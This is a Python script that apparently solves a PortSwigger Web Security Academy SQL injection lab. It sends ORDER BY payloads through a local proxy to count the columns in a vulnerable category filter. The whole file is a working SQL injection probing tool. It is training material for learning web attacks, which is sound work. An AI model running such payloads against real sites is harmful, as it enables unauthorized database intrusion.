# Portswigger SQLi labs 3
# http://portswigger.net/web-security/sql-injection

# Usage
#! python3 lab3.py <url>

# Example Usage
#! python3 lab3.py "https://0aef00e704afed97805da329003b0028.web-security-academy.net"


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        r = requests.get(url + path + sql_payload,
                         verify=False, proxies=proxies)
        res = r.text

        # Check if the response contains "Internal Server Error" to find the column number
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1

    # If the loop completes without finding a column number, return False
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out the number of columns...")
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
    else:
        print("[-] The SQLi attack was not successful!")
